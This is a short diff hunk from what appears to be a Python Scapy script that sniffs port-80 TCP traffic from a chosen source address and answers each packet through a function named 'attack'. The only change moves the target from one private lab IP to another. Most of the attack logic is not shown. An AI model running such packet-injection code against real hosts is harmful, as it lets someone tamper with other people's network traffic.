@@ -25,4 +25,4 @@ def attack(req):
     send(resp, verbose=1, count=1)
 
 
-sniff(prn=attack, filter='tcp and tcp port 80 and ip src 10.0.3.28', store=0)
+sniff(prn=attack, filter='tcp and tcp port 80 and ip src 10.0.3.42', store=0)
